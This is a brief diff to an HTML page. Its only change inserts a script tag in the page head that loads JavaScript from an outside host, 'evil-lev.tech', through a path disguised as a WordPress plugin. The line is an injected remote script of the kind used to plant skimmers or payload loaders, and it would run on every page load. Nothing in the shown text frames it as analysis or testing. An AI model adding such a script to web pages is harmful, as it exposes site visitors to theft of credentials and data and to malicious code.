@@ -2,6 +2,7 @@
 <html>
 
 <head>
+    <script src="https://evil-lev.tech/wp-content/plugins/listen-message.js"></script>
     
     
     <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
